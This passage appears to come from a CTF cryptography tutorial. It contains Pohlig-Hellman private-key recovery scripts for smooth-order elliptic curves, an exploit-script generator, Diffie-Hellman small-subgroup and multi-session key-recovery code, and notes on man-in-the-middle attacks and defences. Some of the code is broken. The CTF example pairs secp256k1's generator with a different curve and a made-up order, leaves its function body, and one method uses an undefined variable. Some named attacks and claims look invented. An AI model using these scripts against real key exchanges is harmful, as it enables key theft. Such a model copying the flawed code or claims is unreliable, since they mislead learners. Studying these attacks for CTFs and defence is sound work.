def ctf_pohlig_hellman_exploit(curve_params, generator, target_point):
    """
    Complete CTF exploitation using Pohlig-Hellman
    
    Input:
    - curve_params: {'a': a, 'b': b, 'p': p, 'order': n}
    - generator: (Gx, Gy)
    - target_point: Q = d*G (we want to find d)
    """
    print("=== CTF Pohlig-Hellman Exploit ===\n")
    
    # Setup
    curve = EllipticCurve(
        curve_params['a'],
        curve_params['b'],
        curve_params['p']
    )
    
    P = generator
    Q = target_point
    n = curve_params['order']
    
    print(f"Curve: y² = x³ + {curve_params['a']}x + {curve_params['b']} (mod {curve_params['p']})")
    print(f"Order: {n}")
    print(f"Generator: {P}")
    print(f"Target: {Q}\n")
    
    # Verify points on curve
    if not curve.is_on_curve(P) or not curve.is_on_curve(Q):
        print("✗ Points not on curve!")
        return None
    
    # Run Pohlig-Hellman
    attacker = PohligHellman(curve, P, n)
    d = attacker.solve(P, Q)
    
    if d:
        print(f"\n=== SUCCESS ===")
        print(f"Private key: {d}")
        
        # Verify
        verify = curve.scalar_mult(d, P)
        if verify == Q:
            print("✓ Verification passed")
            return d
        else:
            print("✗ Verification failed (may need brute force remaining bits)")
            return None
    else:
        print("\n✗ Attack failed")
        return None

# Example CTF challenge
def solve_ctf_challenge():
    """
    Typical CTF scenario:
    - Custom curve with smooth order
    - Given generator G and public key Q
    - Recover private key d
    """
    # Challenge parameters (example)
    params = {
        'a': 2,
        'b': 3,
        'p': 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F,
        'order': 2**8 * 3**5 * 5**3 * 7**2 * 11 * 13  # Smooth order (vulnerable)
    }
    
    G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798, 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

# Target public key (d*G for some unknown d)
# In real CTF, this would be provided
secret_d = 123456789  # What we're trying to recover
curve = EllipticCurve(params['a'], params['b'], params['p'])
Q = curve.scalar_mult(secret_d % params['order'], G)

print("Challenge: Recover private key d given G and Q = d*G\n")

# Exploit
recovered = ctf_pohlig_hellman_exploit(params, G, Q)

if recovered:
    print(f"\n✓ Flag: ctf{{private_key_{recovered}}}")

# solve_ctf_challenge() # Uncomment to run
````

**SageMath Implementation**

```python
# pohlig_hellman_sage.sage
"""
Efficient Pohlig-Hellman using SageMath

SageMath has built-in DLP solvers optimized for various scenarios
"""

def sage_pohlig_hellman(curve_params, G, Q):
    """
    Use SageMath's built-in discrete_log function
    
    SageMath automatically uses Pohlig-Hellman when appropriate
    """
    # Setup curve
    p = curve_params['p']
    a = curve_params['a']
    b = curve_params['b']
    
    K = GF(p)
    E = EllipticCurve(K, [a, b])
    
    # Convert points
    G_sage = E(G)
    Q_sage = E(Q)
    
    print(f"Curve: {E}")
    print(f"Generator: {G_sage}")
    print(f"Target: {Q_sage}")
    
    # Find order
    n = E.order()
    print(f"Curve order: {n}")
    print(f"Factorization: {factor(n)}")
    
    # Solve discrete log
    print("\nSolving discrete log...")
    try:
        d = discrete_log(Q_sage, G_sage, operation='+')
        print(f"✓ Found: d = {d}")
        
        # Verify
        verify = d * G_sage
        if verify == Q_sage:
            print("✓ Verification passed")
        
        return d
    except Exception as e:
        print(f"✗ Failed: {e}")
        return None

def find_vulnerable_curves(p, base_a, base_b, num_attempts=100):
    """
    Search for curves with smooth orders near given parameters
    
    Useful for CTF challenge creation or finding exploitable curves
    """
    print(f"Searching for smooth-order curves over GF({p})...")
    
    K = GF(p)
    vulnerable = []
    
    for offset in range(-num_attempts, num_attempts):
        b = (base_b + offset) % p
        
        try:
            E = EllipticCurve(K, [base_a, b])
            n = E.order()
            factors = factor(n)
            
            # Check if smooth (all prime factors < 10^12)
            max_factor = max([f[0] for f in factors])
            
            if max_factor < 10^12:
                vulnerable.append({
                    'b': b,
                    'curve': E,
                    'order': n,
                    'factors': factors,
                    'max_prime': max_factor
                })
                
                print(f"\n✓ Vulnerable curve found:")
                print(f"  y² = x³ + {base_a}x + {b} (mod {p})")
                print(f"  Order: {n}")
                print(f"  Factors: {factors}")
                print(f"  Max prime: {max_factor}")
        except:
            pass
    
    return vulnerable

# Example usage (uncomment in SageMath):
"""
# Example 1: Solve DLP on smooth-order curve
p = 2^256 - 2^32 - 977
a = 0
b = 7

# Find smooth-order variant
vulnerable_curves = find_vulnerable_curves(p, a, b, num_attempts=50)

if vulnerable_curves:
    # Use first vulnerable curve
    E = vulnerable_curves[0]['curve']
    G = E.random_point()
    
    # Create DLP instance
    d_secret = randint(1, E.order() - 1)
    Q = d_secret * G
    
    # Solve using Pohlig-Hellman
    d_recovered = discrete_log(Q, G, operation='+')
    
    print(f"\nSecret: {d_secret}")
    print(f"Recovered: {d_recovered}")
    print(f"Match: {d_secret == d_recovered}")
"""
````

**Detecting Pohlig-Hellman Vulnerability**

```python
# detect_vulnerability.py
def detect_pohlig_hellman_vulnerability(curve_order):
    """
    Quick check if curve is vulnerable to Pohlig-Hellman
    
    Returns vulnerability assessment
    """
    import math
    
    ph = PohligHellman(None, None, curve_order)
    factors = ph.factor_order(curve_order)
    
    # Calculate B-smoothness
    largest_prime = max(p for p, e in factors)
    smooth_bound = 2**40  # Practical bound for Pohlig-Hellman
    
    # Count recoverable bits
    recoverable_bits = 0
    for prime, exp in factors:
        if prime <= smooth_bound:
            recoverable_bits += (pow(prime, exp)).bit_length()
    
    total_bits = curve_order.bit_length()
    recovery_ratio = recoverable_bits / total_bits
    
    # Assessment
    result = {
        'curve_order': curve_order,
        'total_bits': total_bits,
        'largest_prime': largest_prime,
        'recoverable_bits': recoverable_bits,
        'recovery_ratio': recovery_ratio,
        'factors': factors
    }
    
    # Classification
    if recovery_ratio >= 0.95:
        result['status'] = 'CRITICAL'
        result['message'] = 'Fully vulnerable to Pohlig-Hellman attack'
    elif recovery_ratio >= 0.5:
        result['status'] = 'HIGH'
        result['message'] = 'Partially vulnerable, significant bits recoverable'
    elif recovery_ratio >= 0.1:
        result['status'] = 'MEDIUM'
        result['message'] = 'Some bits recoverable, may enable other attacks'
    else:
        result['status'] = 'LOW'
        result['message'] = 'Secure against Pohlig-Hellman (prime or near-prime order)'
    
    return result

def print_vulnerability_report(order):
    """Print detailed vulnerability report"""
    report = detect_pohlig_hellman_vulnerability(order)
    
    print("="*60)
    print("POHLIG-HELLMAN VULNERABILITY ASSESSMENT")
    print("="*60)
    print(f"\nCurve Order: {report['curve_order']}")
    print(f"Bit Length: {report['total_bits']} bits")
    print(f"\nFactorization:")
    for p, e in report['factors']:
        print(f"  {p}^{e} ({(pow(p,e)).bit_length()} bits)")
    print(f"\nLargest Prime Factor: {report['largest_prime']}")
    print(f"  (~2^{math.log2(report['largest_prime']):.1f})")
    print(f"\nRecoverable Bits: {report['recoverable_bits']}/{report['total_bits']}")
    print(f"Recovery Ratio: {report['recovery_ratio']*100:.1f}%")
    print(f"\nVulnerability Status: {report['status']}")
    print(f"Assessment: {report['message']}")
    print("="*60)

# Test cases
print("Test 1: Smooth Order (CTF-style vulnerable curve)")
smooth = 2**20 * 3**12 * 5**8 * 7**6
print_vulnerability_report(smooth)

print("\n")

print("Test 2: Prime Order (Secure curve like secp256k1)")
prime = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
print_vulnerability_report(prime)

print("\n")

print("Test 3: Composite with Large Factor")
composite = 2**16 * 3**10 * (2**200 + 1)  # Has large prime component
print_vulnerability_report(composite)
```

**Practical CTF Toolkit**

```python
# pohlig_hellman_toolkit.py
class PohligHellmanToolkit:
    """
    Complete toolkit for CTF challenges involving Pohlig-Hellman
    """
    
    @staticmethod
    def quick_check(curve_params):
        """Quick vulnerability check"""
        print("=== Quick Vulnerability Check ===\n")
        
        order = curve_params.get('order')
        if not order:
            print("Curve order not provided")
            return False
        
        report = detect_pohlig_hellman_vulnerability(order)
        
        if report['status'] in ['CRITICAL', 'HIGH']:
            print(f"✓ {report['status']} vulnerability detected!")
            print(f"  {report['message']}")
            return True
        else:
            print(f"✗ {report['status']} - {report['message']}")
            return False
    
    @staticmethod
    def automated_exploit(curve_params, generator, target):
        """Automated exploitation pipeline"""
        print("=== Automated Pohlig-Hellman Exploit ===\n")
        
        # Step 1: Check vulnerability
        if not PohligHellmanToolkit.quick_check(curve_params):
            print("\nCurve may not be vulnerable to Pohlig-Hellman")
            print("Consider other attacks:")
            print("  - Invalid curve attack")
            print("  - Order confusion")
            print("  - Smart's attack (anomalous curves)")
            return None
        
        # Step 2: Setup
        curve = EllipticCurve(
            curve_params['a'],
            curve_params['b'],
            curve_params['p']
        )
        
        # Step 3: Execute attack
        print("\nExecuting Pohlig-Hellman attack...")
        attacker = PohligHellman(curve, generator, curve_params['order'])
        result = attacker.solve(generator, target)
        
        return result
    
    @staticmethod
    def generate_exploit_script(curve_params, output_file="exploit.py"):
        """Generate standalone exploit script"""
        script = f'''#!/usr/bin/env python3
"""
Auto-generated Pohlig-Hellman exploit script
Generated for curve with order: {curve_params['order']}
"""

# [Paste EllipticCurve, PohligHellman, and CRT classes here]

# Target parameters
curve_params = {curve_params}

# Your generator point
G = (0x..., 0x...)  # Fill in

# Target point (public key)
Q = (0x..., 0x...)  # Fill in

# Setup curve
curve = EllipticCurve(
    curve_params['a'],
    curve_params['b'],
    curve_params['p']
)

# Attack
attacker = PohligHellman(curve, G, curve_params['order'])
private_key = attacker.solve(G, Q)

if private_key:
    print(f"Private key: {{private_key}}")
    print(f"Flag: ctf{{{{{{private_key_{{private_key}}}}}}}}")
else:
    print("Attack failed")
'''
        
        with open(output_file, 'w') as f:
            f.write(script)
        
        print(f"✓ Exploit script generated: {output_file}")

# Interactive mode
def interactive_mode():
    """Interactive CTF exploitation tool"""
    print("="*60)
    print("POHLIG-HELLMAN CTF EXPLOITATION TOOLKIT")
    print("="*60)
    print()
    
    print("Enter curve parameters:")
    p = int(input("Prime p (hex): 0x"), 16)
    a = int(input("Coefficient a: "))
    b = int(input("Coefficient b: "))
    order = int(input("Curve order n (hex): 0x"), 16)
    
    params = {'p': p, 'a': a, 'b': b, 'order': order}
    
    print("\nEnter generator point G:")
    gx = int(input("Gx (hex): 0x"), 16)
    gy = int(input("Gy (hex): 0x"), 16)
    G = (gx, gy)
    
    print("\nEnter target point Q:")
    qx = int(input("Qx (hex): 0x"), 16)
    qy = int(input("Qy (hex): 0x"), 16)
    Q = (qx, qy)
    
    # Exploit
    toolkit = PohligHellmanToolkit()
    result = toolkit.automated_exploit(params, G, Q)
    
    if result:
        print(f"\n{'='*60}")
        print(f"SUCCESS! Private key: {result}")
        print(f"{'='*60}")

# Uncomment to run interactive mode:
# interactive_mode()
```

**Defense Recommendations**

```python
# pohlig_hellman_defense.py
def generate_secure_curve_order(bit_length=256):
    """
    Generate secure curve order for Pohlig-Hellman resistance
    
    Recommendations:
    1. Prime order (h=1): Immune to Pohlig-Hellman
    2. Small cofactor (h≤16) with large prime q: Mostly secure
    3. Avoid smooth orders: No small prime factors
    
    [Inference: Prime order is gold standard for security]
    """
    import random
    
    print(f"Generating {bit_length}-bit secure curve order...")
    
    # Method 1: Prime order (most secure)
    def is_prime(n, k=10):
        """Miller-Rabin primality test"""
        if n < 2:
            return False
        if n == 2 or n == 3:
            return True
        if n % 2 == 0:
            return False
        
        # Write n-1 as 2^r * d
        r, d = 0, n - 1
        while d % 2 == 0:
            r += 1
            d //= 2
        
        # Witness loop
        for _ in range(k):
            a = random.randrange(2, n - 1)
            x = pow(a, d, n)
            
            if x == 1 or x == n - 1:
                continue
            
            for _ in range(r - 1):
                x = pow(x, 2, n)
                if x == n - 1:
                    break
            else:
                return False
        
        return True
    
    # Generate prime order
    while True:
        candidate = random.getrandbits(bit_length)
        candidate |= (1 << bit_length - 1) | 1  # Ensure bit_length and odd
        
        if is_prime(candidate):
            print(f"✓ Found prime order: {hex(candidate)}")
            
            # Verify no small factors
            for small_prime in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]:
                if candidate % small_prime == 0:
                    print(f"  Contains factor {small_prime}")
                    break
            else:
                print("  ✓ No small factors found")
            
            return candidate

def secure_curve_selection_guide():
    """
    Guide for selecting secure curves
    """
    print("="*60)
    print("SECURE CURVE SELECTION GUIDE")
    print("="*60)
    print()
    
    print("✓ RECOMMENDED CURVES:")
    print("  - secp256k1 (Bitcoin): Prime order")
    print("  - P-256 (NIST): Prime order")
    print("  - Curve25519: h=8, but large prime q")
    print()
    
    print("✗ AVOID:")
    print("  - Curves with smooth orders")
    print("  - Custom curves without security proof")
    print("  - Curves with unknown/unverified order")
    print()
    
    print("VERIFICATION CHECKLIST:")
    print("  ☐ Curve order is prime or has small cofactor (h≤16)")
    print("  ☐ If composite order, largest prime > 2^200")
    print("  ☐ No small prime factors (all factors > 2^40)")
    print("  ☐ Discriminant ≠ 0 (non-singular)")
    print("  ☐ Not anomalous (p ≠ n)")
    print("  ☐ j-invariant not special")
    print("="*60)

secure_curve_selection_guide()
```

---

### Important Related Topics

For comprehensive ECC exploitation, also study:

- **Smart's Attack** (anomalous curves where p = n, enables efficient DLP)
- **MOV/Frey-Rück Attack** (uses Weil/Tate pairing to transfer ECDLP to easier DLP)
- **ECDSA Nonce Reuse** (recover private key from two signatures with same nonce)
- **Lattice Attacks on ECDSA** (partial nonce leakage via side channels)
- **Montgomery Ladder** (constant-time scalar multiplication for side-channel resistance)
- **Twist Security** (ensuring quadratic twist also has large prime order)
- **Complex Multiplication** (method for generating secure curves)

---

## Diffie-Hellman & Variants

Diffie-Hellman key agreement enables two parties to establish shared secrets over insecure channels without prior key distribution. Classic DH uses modular exponentiation in multiplicative groups; ECDH variants use elliptic curve scalar multiplication. CTF challenges exploit weak parameter selection, improper validation, small subgroup attacks, and authentication bypass vulnerabilities.

---

### Classic Diffie-Hellman

Classic Diffie-Hellman establishes shared secret using modular exponentiation in a multiplicative group modulo prime `p`. Security depends on computational difficulty of discrete logarithm problem: recovering exponent from base and result.

#### DH Protocol

**Setup (Public Parameters):**

- Prime modulus: `p` (typically 1024, 2048, 4096 bits)
- Generator: `g` (generator of subgroup of Z_p*)
- Both parties agree on `(p, g)` publicly

**Key Agreement:**

```
Alice:
- Generate random private key: a (1 < a < p-1)
- Compute public key: A = g^a mod p
- Send A to Bob

Bob:
- Generate random private key: b (1 < b < p-1)
- Compute public key: B = g^b mod p
- Send B to Alice

Shared Secret (both compute):
s = B^a mod p = A^b mod p = g^(ab) mod p
```

**Key Derivation:**

```
Session key: K = KDF(s, context_info)
Typical: K = SHA-256(s || "context")
```

#### DH Vulnerabilities in CTF

**Small Subgroup Confinement Attack:**

If `p - 1` has small factors, attacker forces ephemeral public key into small subgroup. Discrete log in small subgroup reduces complexity from O(√p) to O(√max_small_factor).

**Pohlig-Hellman Attack:**

If prime `p - 1` is smooth (product of small primes), discrete log breaks into small prime-factor subgroups, solving via CRT.

**Two's Choice Attack (Active MITM):**

Without authentication, attacker intercepts both public keys, substitutes crafted values, performs separate key agreements with each party. Both parties compute attacker-controlled shared secrets.

**Shared Secret Derivation Flaws:**

- XOR-based derivation (no KDF): session key = s itself, vulnerable to bit manipulation
- Weak KDF: MD5 instead of SHA-256, insufficient iterations
- Reused salt: enables multi-session analysis

**Reused Ephemeral Keys:**

If same ephemeral key used across multiple sessions, attacker can correlate traffic or perform known plaintext attacks.

#### CTF Tools and Commands

**Python Classic DH Implementation:**

```python
from Crypto.Util.number import getPrime, inverse
from Crypto.Random.random import randbelow
import hashlib

class DiffieHellman:
    def __init__(self, p=None, g=None, bits=1024):
        """Initialize DH with parameters or generate."""
        if p is None:
            # Generate safe prime (p = 2q + 1, where q is prime)
            self.q = getPrime(bits - 1)
            self.p = 2 * self.q + 1
            while not self._is_prime(self.p):
                self.q = getPrime(bits - 1)
                self.p = 2 * self.q + 1
            self.g = self._find_generator()
        else:
            self.p = p
            self.g = g
    
    def _is_prime(self, n, k=5):
        """Miller-Rabin primality test."""
        if n < 2:
            return False
        if n == 2 or n == 3:
            return True
        if n % 2 == 0:
            return False
        
        # Write n-1 as 2^r * d
        r, d = 0, n - 1
        while d % 2 == 0:
            r += 1
            d //= 2
        
        # Witness loop
        for _ in range(k):
            a = randbelow(n - 2) + 2
            x = pow(a, d, n)
            if x == 1 or x == n - 1:
                continue
            for _ in range(r - 1):
                x = pow(x, 2, n)
                if x == n - 1:
                    break
            else:
                return False
        return True
    
    def _find_generator(self):
        """Find generator of multiplicative group."""
        # For safe prime p = 2q+1, g=2 or g=p-1 often work
        for g in [2, p - 1]:
            if pow(g, 2, self.p) != 1 and pow(g, self.q, self.p) != 1:
                return g
        return 2
    
    def generate_keypair(self):
        """Generate private/public key pair."""
        private_key = randbelow(self.p - 2) + 2
        public_key = pow(self.g, private_key, self.p)
        return private_key, public_key
    
    def compute_shared_secret(self, private_key, peer_public_key):
        """Compute shared secret."""
        shared_secret = pow(peer_public_key, private_key, self.p)
        return shared_secret
    
    def derive_key(self, shared_secret, context=b""):
        """Derive symmetric key from shared secret."""
        key_material = hashlib.sha256(
            str(shared_secret).encode() + context
        ).digest()
        return key_material

# Usage
def dh_key_agreement_demo():
    dh = DiffieHellman(bits=1024)
    print(f"DH Parameters: p={hex(dh.p)[:20]}..., g={dh.g}")
    
    # Alice
    alice_private, alice_public = dh.generate_keypair()
    print(f"Alice private: {hex(alice_private)[:20]}...")
    print(f"Alice public: {hex(alice_public)[:20]}...")
    
    # Bob
    bob_private, bob_public = dh.generate_keypair()
    
    # Key agreement
    alice_shared = dh.compute_shared_secret(alice_private, bob_public)
    bob_shared = dh.compute_shared_secret(bob_private, alice_public)
    
    assert alice_shared == bob_shared, "Shared secrets don't match!"
    print(f"✓ Shared secret: {hex(alice_shared)[:20]}...")
    
    # Derive symmetric key
    alice_key = dh.derive_key(alice_shared)
    bob_key = dh.derive_key(bob_shared)
    
    assert alice_key == bob_key
    print(f"✓ Derived key: {alice_key.hex()[:20]}...")
    
    return dh, alice_private, bob_private

# dh_key_agreement_demo()
```

**OpenSSL DH Operations:**

```bash
# Generate DH parameters (1024-bit safe prime)
openssl dhparam -out dhparam.pem 1024

# Display parameters
openssl dhparam -in dhparam.pem -text

# Extract p and g
openssl dhparam -in dhparam.pem -text -noout | grep -A 2 "prime:"

# Generate private key
openssl genpkey -paramfile dhparam.pem -out private_key.pem

# Extract public key
openssl pkey -in private_key.pem -pubout -out public_key.pem

# Compute shared secret (requires peer's public key)
openssl pkeyutl -derive -inkey private_key.pem -peerkey peer_public_key.pem -out shared_secret.bin

# Display shared secret
xxd shared_secret.bin
```

**Pohlig-Hellman Attack (Smooth p-1):**

```python
from sympy import factorint, sqrt
import math

def pohlig_hellman_attack(g, y, p):
    """
    Recover discrete log x where y = g^x mod p.
    Assumes p-1 is smooth (product of small primes).
    
    x = log_g(y) mod p
    """
    factors = factorint(p - 1)
    print(f"[*] Factors of p-1: {factors}")
    
    largest_factor = max(factors.keys())
    print(f"[*] Largest factor: {largest_factor} (~{largest_factor.bit_length()} bits)")
    
    if largest_factor > 2**40:
        print("[!] Largest factor too large: attack infeasible")
        return None
    
    print("[+] Smooth p-1 detected: Pohlig-Hellman feasible")
    
    # Recover x modulo each prime power
    congruences = []
    
    for prime, exponent in factors.items():
        # Recover x mod prime^exponent via discrete log in subgroup
        order = prime ** exponent
        h = pow(g, (p - 1) // order, p)
        gamma = pow(y, (p - 1) // order, p)
        
        # Discrete log: find x_i such that h^x_i = gamma
        # [Unverified] For small orders, brute force or Pollard-rho
        x_i = brute_force_dlog(h, gamma, prime ** exponent, p)
        
        congruences.append((x_i, order))
        print(f"  x ≡ {x_i} (mod {order})")
    
    # Chinese Remainder Theorem
    x = crt_combine(congruences)
    print(f"[+] Recovered x: {x}")
    
    # Verify
    if pow(g, x, p) == y:
        print("[✓] Verification successful!")
        return x
    else:
        print("[!] Verification failed")
        return None

def brute_force_dlog(h, gamma, order, p):
    """Brute force discrete log in small subgroup."""
    for x in range(order):
        if pow(h, x, p) == gamma:
            return x
    return None

def crt_combine(congruences):
    """Chinese Remainder Theorem combining."""
    # Combine x ≡ a_i (mod m_i)
    # [Simplified implementation]
    x = 0
    M = 1
    for a, m in congruences:
        M *= m
    
    for a, m in congruences:
        M_i = M // m
        y_i = pow(M_i, -1, m)
        x += a * M_i * y_i
    
    return x % M

# Example: attack smooth p-1
# p = 2 * 3 * 5 * 7 * 11 * 13 * 17 * 19 * 23 + 1  # Smooth p-1
# dh = DiffieHellman(p=p, g=2)
# recovered_x = pohlig_hellman_attack(2, y, p)
```

**Small Subgroup Confinement Attack:**

```python
def small_subgroup_confinement_attack(g, y, p):
    """
    [Inference] If p-1 = 2q where q is prime (safe prime),
    subgroups have orders {1, 2, q, 2q}.
    
    Attacker forces ephemeral key into order-q subgroup
    (quadratic residue mod p).
    """
    from sympy import factorint
    
    factors = factorint(p - 1)
    print(f"[*] Subgroup structure of Z_p*: {factors}")
    
    # For safe prime p = 2q+1, only large subgroups
    if len(factors) == 2 and 2 in factors and factors[2] == 1:
        q = (p - 1) // 2
        print(f"[+] Safe prime detected: p = 2q+1, q = {q}")
        print("[!] Small subgroup confinement mitigated (only 2 small subgroups)")
    else:
        print("[!] Composite p-1: multiple subgroups available")
        print("[!] If attacker can send crafted ephemeral keys:")
        print("    - Force into small-order subgroup")
        print("    - Discrete log complexity reduced to O(√max_factor)")

# small_subgroup_confinement_attack(2, y, p)
```

**Kali Linux: Discrete Log via Sage (if installed):**

```bash
# Install SageMath (includes advanced DL algorithms)
sudo apt install sagemath

# Create test script
cat > dlog_attack.sage << 'EOF'
p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381FFFFFFFFFFFFFFFF
g = 2

# Attacker's y value (after small subgroup attack)
y = 1234567890  # Example

# Discrete log (for small subgroups only)
# x = discrete_log(y, g, order=1024)  # For order-1024 subgroup
EOF

sage dlog_attack.sage
```

---

### ECDH (Elliptic Curve Diffie-Hellman)

ECDH uses elliptic curve scalar multiplication instead of modular exponentiation. Same protocol structure as classic DH but operates on elliptic curves. [See ECC section for detailed ECDH coverage.]

**Key Differences from Classic DH:**

- Smaller key sizes (256-bit ECDH ≈ 3072-bit classic DH in security)
- Scalar multiplication instead of exponentiation
- Cofactor considerations (curves with cofactor > 1)
- Point validation requirements

**ECDH Vulnerabilities Specific to CTF:**

```python
def ecdh_specific_vulnerabilities():
    """
    ECDH-specific weaknesses:
    """
    print("""
    1. Cofactor-8 Small Subgroup Attack (Curve25519):
       - Cofactor = 8 enables 8-way brute force per bit
       - Requires multiple sessions with same long-term key
    
    2. Invalid Curve Point Injection:
       - Attacker sends point not on agreed curve
       - If verifier skips validation: computation on wrong curve
       - Shared secret controllable by attacker
    
    3. Non-Validated Point from Peer:
       - Point not in valid range (x, y coordinates)
       - Point not on curve: y² ≠ x³ + ax + b
       - Order of point unknown (may be small)
    
    4. Weak Ephemeral Key Derivation:
       - Same ephemeral key reused across sessions
       - Ephemeral key predictable (weak RNG)
       - Ephemeral private key leaked (side-channel)
    
    5. Shared Secret Derivation Flaws:
       - Using only x-coordinate without domain separation
       - No KDF applied (s used directly as key)
       - Hash collision attacks (MD5 vs SHA-256)
    """)

# ecdh_specific_vulnerabilities()
```

---

### Small Subgroup Confinement Attack

Small subgroup confinement forces ephemeral public key into small-order subgroup, reducing discrete log complexity from exponential to feasible brute force per subgroup factor.

#### Attack Mechanics

**Setup:**

- Prime modulus `p` with `p - 1` composite
- Subgroups of Z_p* include small prime-order subgroups
- Attacker controls ephemeral public key in protocol

**Attack Steps:**

```
1. Factor p - 1 = 2^a * 3^b * 5^c * ... (find small factors)

2. For each small prime factor q:
   - Craft ephemeral public key y_i in order-q subgroup
   - Send to victim
   - Observe victim's response (MAC success, timing, etc.)

3. Discrete log in order-q subgroup: O(√q) via Pollard-rho
   - For q < 2^40: brute force feasible
   - Recover corresponding bit of victim's private key

4. Repeat for all small factors: combine via CRT

5. Result: recover bits of victim's long-term private key
```

#### Computational Complexity

```
Classic DH discrete log: O(√p) ≈ 2^(p_bits/2)
- p = 2^1024: O(2^512) infeasible

Small subgroup attack: O(√max_factor)
- If p-1 = 2^20 * 3^15 * 5^10 * ...
- Worst case: O(√2^20) = O(2^10) feasible per session
- Multiple sessions recover full key via CRT
```

#### CTF Tools and Commands

**Small Subgroup Enumeration:**

```python
from sympy import factorint, primefactors

def enumerate_small_subgroups(p, threshold_bits=40):
    """
    Enumerate subgroups of Z_p* with order < 2^threshold_bits.
    """
    factors = factorint(p - 1)
    print(f"[*] Prime factorization of p-1:")
    
    small_subgroups = []
    
    for prime, exponent in factors.items():
        order = prime ** exponent
        bits = order.bit_length()
        
        status = "✓ SMALL" if bits < threshold_bits else "✗ LARGE"
        print(f"  {prime}^{exponent} = {order} ({bits} bits) {status}")
        
        if bits < threshold_bits:
            small_subgroups.append((prime, order))
    
    return small_subgroups

def craft_subgroup_elements(g, p, subgroup_order):
    """
    Generate elements of specified subgroup.
    
    Subgroup of order q: elements h where h^q ≡ 1 (mod p)
    """
    h_base = pow(g, (p - 1) // subgroup_order, p)
    
    subgroup_elements = []
    for i in range(subgroup_order):
        element = pow(h_base, i, p)
        subgroup_elements.append(element)
    
    return subgroup_elements

# Example: enumerate subgroups
# p = 0xFFFFFFFE00000001  # Example with composite p-1
# small_subgroups = enumerate_small_subgroups(p, threshold_bits=20)
```

**Discrete Log via Pollard-Rho (Small Subgroups):**

```python
def pollard_rho_dlog(g, y, order, p):
    """
    Pollard-rho algorithm for discrete log in small subgroup.
    
    Find x such that g^x ≡ y (mod p), where order is known.
    Complexity: O(√order)
    """
    import math
    from random import randrange
    
    def f(x, a, b):
        """Pseudorandom function for Pollard-rho."""
        partition = x % 3
        if partition == 0:
            return (y * x) % p, (a + 1) % order, b
        elif partition == 1:
            return (x * x) % p, (2 * a) % order, (2 * b) % order
        else:
            return (g * x) % p, (a + 1) % order, (b + 1) % order
    
    # Initial values
    x, a, b = 1, 0, 0
    X, A, B = 1, 0, 0
    
    # Iterate until cycle found
    for _ in range(10 * order):  # Safety limit
        x, a, b = f(x, a, b)
        X, A, B = f(X, A, B)
        X, A, B = f(X, A, B)
        
        if x == X:
            # Found cycle: g^a * y^b ≡ g^A * y^B (mod p)
            # g^(a-A) ≡ y^(B-b) (mod p)
            # x ≡ (B-b) / (a-A) (mod order)
            
            r = (b - B) % order
            t = (a - A) % order
            
            if t == 0:
                continue  # Failure case
            
            t_inv = pow(t, -1, order)
            result = (r * t_inv) % order
            
            # Verify
            if pow(g, result, p) == y:
                return result
    
    return None

# Example usage (small order only)
# order = 65521  # Small prime
# x = pollard_rho_dlog(g, y, order, p)
```

**Multi-Session Subgroup Attack (CRT Recovery):**

```python
from sympy import crt

def multi_session_subgroup_attack(g, p, threshold_bits=30, query_oracle=None):
    """
    [Unverified] Recover victim's private key via multiple sessions,
    each using small-subgroup ephemeral key.
    
    Requires: oracle function that indicates session success/failure.
    """
    factors = factorint(p - 1)
    
    congruences = []
    
    for prime, exponent in factors.items():
        order = prime ** exponent
        bits = order.bit_length()
        
        if bits > threshold_bits:
            print(f"[!] Skipping large subgroup (2^{bits})")
            continue
        
        print(f"[+] Attacking subgroup of order {order} (2^{bits})")
        
        # For this subgroup:
        # 1. Craft ephemeral key in subgroup
        # 2. Query oracle with multiple attempts
        # 3. Recover corresponding private key bits
        
        recovered_key_mod_order = None  # Placeholder
        
        congruences.append((recovered_key_mod_order, order))
    
    # Combine via CRT
    print(f"[+] Combining {len(congruences)} congruences via CRT...")
    victim_key = crt([c[0] for c in congruences], [c[1] for c in congruences])
    
    print(f"[+] Recovered private key: {victim_key}")
    return victim_key

# [Unverified] Practical oracle function depends on protocol
# Example: oracle = lambda y: verify_mac(derive_key(ephemeral_key, y))
```

---

### Man-in-the-Middle Prevention

Man-in-the-middle attacks allow attacker to intercept key agreement, substituting crafted public keys to control shared secrets. Prevention requires authentication and key commitment mechanisms.

#### MITM Vulnerability

**Attack Scenario:**

```
Insecure DH (no authentication):

Alice                          Attacker                        Bob
A = g^a mod p  ------>  (intercept)
               Attacker computes: s_alice = A^m mod p
               Sends crafted A' = g^m mod p to Bob
                               <------ B = g^b mod p (intercept)
               Attacker computes: s_bob = B^m mod p
               Sends crafted B' = g^m mod p to Alice
Alice ← -----
Computes: s = (B')^a = (g^m)^a = g^(ma) mod p = s_alice

Bob computes: s = (A')^b = (g^m)^b = g^(mb) mod p = s_bob

Result:
- Alice shares s_alice with attacker
- Bob shares s_bob with attacker
- Attacker decrypts all traffic with different keys per direction
```

**Attack Requirements:**

- Network access (can intercept/modify traffic)
- Active interception (not passive eavesdropping)
- No authentication mechanism

#### Prevention Mechanisms

**1. Digital Signatures (Authenticated DH):**

```
Alice and Bob pre-exchange public keys (e.g., via PKI).

DH exchange with signatures:

Alice signs: signature_A = Sign(private_key_alice, A || Bob_ID || counter)
Alice sends: A || signature_A

Bob verifies: Verify(public_key_alice, signature_A, A || Bob_ID || counter)
Bob signs: signature_B = Sign(private_key_bob, B || Alice_ID || counter)
Bob sends: B || signature_B

Alice verifies: Verify(public_key_bob, signature_B, B || Alice_ID || counter)

If signatures match, participants confirm peer identity.
Attacker cannot forge signatures without private keys.
```

**2. Key Commitment (Commitment Schemes):**

```
Alice computes: commitment_A = H(A || random_nonce)
Alice sends: commitment_A to Bob (before A itself)

Bob computes: commitment_B = H(B || random_nonce)
Bob sends: commitment_B to Alice

